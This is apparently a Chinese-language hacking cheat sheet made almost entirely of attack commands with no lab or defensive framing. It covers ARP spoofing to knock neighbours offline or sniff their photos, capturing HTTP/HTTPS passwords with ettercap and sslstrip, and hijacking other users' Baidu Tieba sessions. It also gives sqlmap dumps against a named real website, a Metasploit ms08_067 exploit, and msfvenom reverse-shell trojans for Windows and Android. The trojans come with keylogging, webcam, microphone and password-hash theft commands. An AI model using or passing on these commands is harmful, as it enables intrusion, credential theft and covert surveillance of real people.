<div id="Other.md"></div>

[一、局域网断网攻击](#一)  
[二、获取内网妹子的QQ相册](#二)  
[三、HTTP账号密码获取](#三)  
[四、HTTPS账号密码获取](#四)  
[五、会话劫持-登录别人的百度贴吧](#五)  
[六、会话劫持-一键劫持会话](#六)  
[七、SQLMAP介绍及ASP网站渗透](#七)  
[八、SQLMAP介绍之PHP网站渗透](#八)  
[九、SQLMAP介绍之Cookie注入](#九)  
[十、metasploit新手知识补全](#十)  
[十一、Metasploit之我的远程控制软件](#十一)  
[十二、Metasploit之木马文件操作功能](#十二)  
[十三、Metasploit之木马系统操作功能](#十三)  
[十四、木马的用户操作及摄像头操作](#十四)  
[十五、Metasploit之渗透安卓实战](#十五)  
[十六、Metasploit之服务器蓝屏攻击](#十六)  

==============================


<h5 id="一">一、局域网断网攻击</h5>
arp攻击</br>
命令格式，如下：</br>  
#arpspoof -i 网卡 -t 目标IP 网关</br>

arp攻击原理：</br>
目标的IP流量会经过我的网卡，没有从网关出去（因没有配置IP转发）</br>

看局域网中的IP</br>
#fping -asg 192.168.1.0/24

<h5 id="二">二、获取内网妹子的QQ相册</h5>  
IP流量转发</br>
#echo 1 > /proc/sys/net/ipv4/ip_forward

arp欺骗  
命令格式，如下：  
#arpspoof -i 网卡 -t 目标IP 网关 

arp欺骗原理：</br>
目标的IP流量会经过我的网卡，从网关出去</br>
目标机器上arp -a可以看到网关攻击者的IP

获取本机网卡的图  
#driftnet -i 网卡

<h5 id="三">三、HTTP账号密码获取</h5>
#echo 1 > /proc/sys/net/ipv4/ip_forward
#arpspoof -i eth0 -t 目标IP 网关
#ettercap -Tq -i 网卡
-T启动文本模式
-q安静模式
==>返回结果中，可以看到登录页面，用户名和密码

中文用户名需要URL解码，可以百度解码页面

<h5 id="四">四、HTTPS账号密码获取</h5>
#vi /etc/ettercap/etter.conf
去掉下面的注释
# if you use iptables:
   #redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
   #redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

把HTTPS的链接还原为HTTP
#sslstrip -a -f -k

#echo 1 > /proc/sys/net/ipv4/ip_forward
#arpspoof -i eth0 -t 目标IP 网关
#ettercap -Tq -i 网卡

缺点：
容易出现证书错误


<h5 id="五">五、会话劫持-登录别人的百度贴吧</h5>
重新生成抓包后的文件
ferret  
重放流量
hamster
*第一种方法：
#echo 1 > /proc/sys/net/ipv4/ip_forward
#arpspoof -i eth0 -t 目标IP 网关

#wireshark  （等待目标机器浏览网站，wireshark保存抓包文件）
#ferret -r *.cap
#hamster    (根据显示，修改浏览器代理，并在浏览器中访问http://IP：port)

*第二种方法
#echo 1 > /proc/sys/net/ipv4/ip_forward
#arpspoof -i eth0 -t 目标IP 网关
#ferret -i 网卡
#hamster


<h5 id="六">六、会话劫持-一键劫持会话</h5>
#echo 1 > /proc/sys/net/ipv4/ip_forward
#arpspoof -i eth0 -t 目标IP 网关
1）使用CookieCadger-1.08.jar工具
2）选择网卡，启动（等待目标机器操作）


<h5 id="七">七、SQLMAP介绍及ASP网站渗透</h5>
windows下的软件：明小子，啊D，NBSI，御剑

#sqlmap -u 网址
-u：检测是否存在SQL注入，返回数据库名字

#sqlmap -u 网址 --tables
--tables：列出所有表名

#sqlmap -u 网址 --columns -T "表名"
--columns：列出所有列名

#sqlmap -u 网址 --dump -C "列名，列名" -T "表名"
--dump：下载数据（如：列名可写为：username,password）


<h5 id="八">八、SQLMAP介绍之PHP网站渗透</h5>
#sqlmap -u 网址 --is-dba
--is-db：检测是否DBA权限，可以写文件

#sqlmap -u 网址 --dbs
--dbs：列出所有数据库

#sqlmap -u 网址 --current-db
--current-db：查找自己的数据库

#sqlmap -u 网址 --tables -D "数据库名"
#sqlmap -u 网址 --columns -T "表名" -D "数据库名"
#sqlmap -u 网址 --dump -C "列名，列名" -T "表名" -D "数据库名"



<h5 id="九">九、SQLMAP介绍之Cookie注入</h5>
使用cookie中转注入方式
网站为http://www.wisefund.com.cn/about.asp?id=56
#sqlmap -u "http://www.wisefund.com.cn/about.asp" --cookie "id=56" --level 2
--cookie：写id的参数，如果是cookie注入，需要把等级提升为level 2

#sqlmap -u "http://www.wisefund.com.cn/about.asp" --tables "表名"--cookie "id=56" --level 2

<h5 id="十">十、metasploit新手知识补全</h5>
#apt-get update && apt-get upgrade && apt-get dist-upgrade && apt-get clean
（使用前更新库）
#apt-get remove metasploit
#apt-get install metasploit

#msfconsole
exploit模块：漏洞利用
payloads：shellcode，漏洞利用后执行的代码

->help      //帮助
->show      //显示所有命令
->clear     //清除
->use exploit/windows/smb/ms08_067_netapi   //漏洞利用模块
->show options  //显示输入参数 
->set RHOST 192.168.1.100
->set payload windows/meterpreter/reverse_tcp       //攻击利用
->set LHOST 192.168.1.101
->exploit       //执行


<h5 id="十一">十一、Metasploit之我的远程控制软件</h5>

木马：控制端---服务端
根据自己的IP（如：19.168.1.103 55555）生成一个木马
#msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=55555 X > test.exe    
//注：kali2.0 msfpayload和msfencode合并成了msfvenom，如下
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=55555 CMD=test.exe EXITFUNC=thread -f exe -o ./test.exe

#msfconsole
->use exploit/multi/handler     //选择漏洞模块
->set payload windows/meterpreter/reverse_tcp       //选择shellcode
->show options
->set LHOST 192.168.0.103
->set LPORT 55555
->exploit       //等待目标主机双击木马test.exe

-->sysinfo
-->shell


<h5 id="十二">十二、Metasploit之木马文件操作功能</h5>
接着十一节，使用木马
-->help
-->background        //当前会话在后台运行

->sessions -l       //显示会话
->sessions -i 1     //选择进入会话

-->ps       //得到要注入的PID进程
-->migrate 进程ID     //注入进程：木马随时有可能被结束掉

-->run vnc      //查看目标主机远程桌面

-->download 文件名    //下载文件
-->upload 文件名      //上传文件
-->edit 文件名        //编辑文件
-->cat 文件名         //查看文件


<h5 id="十三">十三、Metasploit之木马系统操作功能</h5>

-->arp      //查看arp缓冲表
-->ifconfig
-->getproxy     //获取代理
-->netstat

-->kill     //结束进程
-->ps       //查看进程
-->reg      //注册表
-->shell    //获取shell
-->reboot
-->shutdown
-->sysinfo      //获取电脑信息


<h5 id="十四">十四、Metasploit之木马的用户操作及摄像头操作</h5>

-->enumdesktops        //用户登录数
-->keyscan_dump        //键盘记录-下载
-->keyscan_start       //键盘记录-开始
-->keyscan_stop        键盘记录-结束
-->uictl               //获取键盘鼠标控制权
-->record_mic          //音频录制
（看视频下载安装agt-get install mplayer）
-->webcam_chat         //查看摄像头接口
-->webcam_list         //查看摄像头列表
-->webcam_stream       //摄像头视频获取
-->getsystem           //获取高权限
-->hashdump            //下载hash密文


<h5 id="十五">十五、Metasploit之渗透安卓实战</h5>
根据自己的IP（如：19.168.1.103 55555）生成一个木马
#msfpayload android/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=55555 R > test.apk    
//注：kali2.0 msfpayload和msfencode合并成了msfvenom，如下
#msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.103 LPORT=55555 > test.apk

#msfconsole
->use exploit/multi/handler     //选择漏洞模块
->set payload android/meterpreter/reverse_tcp       //选择shellcode
->set LHOST 192.168.0.103
->set LPORT 55555
->exploit

-->search       //如搜索jpg、png、bmp
-->download     //如下载jpg、png、bmp
-->webcam_snmp  //截屏
-->webcam_stream    //摄像头监控
-->check_root   //检测root
-->dump_calllog     //下载电话


<h5 id="十六">十六、Metasploit之服务器蓝屏攻击</h5>



